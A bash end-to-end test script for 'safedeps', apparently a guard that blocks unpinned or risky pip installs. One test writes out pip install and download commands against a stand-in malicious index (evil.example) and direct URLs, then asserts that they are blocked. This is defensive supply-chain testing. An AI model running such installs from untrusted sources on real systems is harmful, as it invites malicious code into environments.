#!/usr/bin/env bash
set -euo pipefail

runner_temp="${RUNNER_TEMP:-/tmp}"
python_bin="${PYTHON_BIN:-python}"

activate_guard() {
  local project="$1"
  local scope="${2:-project}"
  mkdir -p "$project"
  cd "$project"
  "$python_bin" -m safedeps.cli setup . --fail-on HIGH --install-scope system --protection-scope "$scope"
  # shellcheck disable=SC1091
  source ./.safedeps/activate.sh
  hash -r
}

assert_blocked() {
  local message="$1"
  shift
  if "$@"; then
    echo "$message"
    exit 1
  fi
}

test_basic_install_policy() {
  local project="$runner_temp/safedeps-pip-e2e"
  activate_guard "$project"
  assert_blocked "Expected unpinned pip install to be blocked." pip install six
  pip install six==1.17.0
}

test_requirements_policy() {
  local project="$runner_temp/safedeps-requirements-e2e"
  activate_guard "$project"
  printf "six\n" > requirements.txt
  assert_blocked "Expected unpinned requirements install to be blocked." pip install -r requirements.txt
  printf "six==1.17.0\n" > requirements.txt
  pip install -r requirements.txt
}

test_constraints_policy() {
  local project="$runner_temp/safedeps-constraints-e2e"
  activate_guard "$project"
  printf "urllib3\n" > constraints.txt
  assert_blocked "Expected unpinned constraints install to be blocked." pip install -c constraints.txt six==1.17.0
  printf "urllib3==2.2.3\n" > constraints.txt
  pip install -c constraints.txt six==1.17.0
}

test_combined_requirements_constraints_policy() {
  local project="$runner_temp/safedeps-combined-requirements-constraints-e2e"
  activate_guard "$project"
  printf "six==1.17.0\n" > requirements.txt
  printf "urllib3\n" > constraints.txt
  assert_blocked "Expected unpinned combined constraints install to be blocked." pip install -r requirements.txt -c constraints.txt
  printf "urllib3==2.2.3\n" > constraints.txt
  pip install -r requirements.txt -c constraints.txt
}

test_risky_source_policy() {
  local project="$runner_temp/safedeps-pip-sources-e2e"
  activate_guard "$project"
  assert_blocked "Expected direct URL install to be blocked." pip install "demo @ https://example.test/demo-1.0.0.tar.gz"
  assert_blocked "Expected untrusted pip index install to be blocked." pip install --index-url https://evil.example/simple six==1.17.0
  assert_blocked "Expected untrusted extra pip index install to be blocked." pip install --extra-index-url https://evil.example/simple six==1.17.0
  assert_blocked "Expected direct URL download to be blocked." pip download "demo @ https://example.test/demo-1.0.0.tar.gz"
  assert_blocked "Expected untrusted extra pip index download to be blocked." pip download --extra-index-url https://evil.example/simple six==1.17.0
}

test_local_path_and_editable_are_allowed() {
  local project="$runner_temp/safedeps-local-path-e2e"
  local package_path="$runner_temp/safedeps-local-package-path"
  local package_editable="$runner_temp/safedeps-local-package-editable"
  mkdir -p "$package_path/src/local_demo_path" "$package_editable/src/local_demo_editable"
  cat > "$package_path/pyproject.toml" <<'EOF'
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "safedeps-local-demo-path"
version = "0.0.1"
EOF
  cat > "$package_editable/pyproject.toml" <<'EOF'
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "safedeps-local-demo-editable"
version = "0.0.1"
EOF
  printf "__version__ = '0.0.1'\n" > "$package_path/src/local_demo_path/__init__.py"
  printf "__version__ = '0.0.1'\n" > "$package_editable/src/local_demo_editable/__init__.py"
  activate_guard "$project"
  pip install --no-build-isolation "$package_path"
  pip install --no-build-isolation -e "$package_editable"
}

test_uninstall_is_blocked() {
  local project="$runner_temp/safedeps-uninstall-e2e"
  activate_guard "$project"
  assert_blocked "Expected pip uninstall to be blocked." pip uninstall -y six
}

test_python_module_pip_bypass_is_blocked() {
  local project="$runner_temp/safedeps-python-m-pip-e2e"
  activate_guard "$project"
  assert_blocked "Expected unpinned python -m pip install to be blocked." python -m pip install six
}

test_project_scope_allows_outside_project() {
  local project="$runner_temp/safedeps-project-scope-e2e"
  local outside="$runner_temp/safedeps-project-scope-outside"
  mkdir -p "$outside"
  activate_guard "$project"
  cd "$outside"
  pip install six==1.17.0
}

test_global_scope_blocks_outside_project() {
  local project="$runner_temp/safedeps-global-scope-e2e"
  local outside="$runner_temp/safedeps-global-scope-outside"
  mkdir -p "$outside"
  activate_guard "$project" global
  cd "$outside"
  assert_blocked "Expected global scope to block unpinned install outside project." pip install six
}

test_project_venv_guard_blocks_pip_installs() {
  local project="$runner_temp/safedeps-venv-e2e"
  mkdir -p "$project"
  cd "$project"
  "$python_bin" -m venv .venv
  if [ -f ".venv/bin/activate" ]; then
    # shellcheck disable=SC1091
    source .venv/bin/activate
  else
    # shellcheck disable=SC1091
    source .venv/Scripts/activate
  fi
  python -m pip install --upgrade pip
  python -m pip install -e "$GITHUB_WORKSPACE"
  python -m safedeps.cli setup . --fail-on HIGH --install-scope project --protection-scope project
  # shellcheck disable=SC1091
  source ./.safedeps/activate.sh
  hash -r
  assert_blocked "Expected unpinned venv pip install to be blocked." pip install six
}

test_basic_install_policy
test_requirements_policy
test_constraints_policy
test_combined_requirements_constraints_policy
test_risky_source_policy
test_local_path_and_editable_are_allowed
test_uninstall_is_blocked
test_python_module_pip_bypass_is_blocked
test_project_scope_allows_outside_project
test_global_scope_blocks_outside_project
test_project_venv_guard_blocks_pip_installs
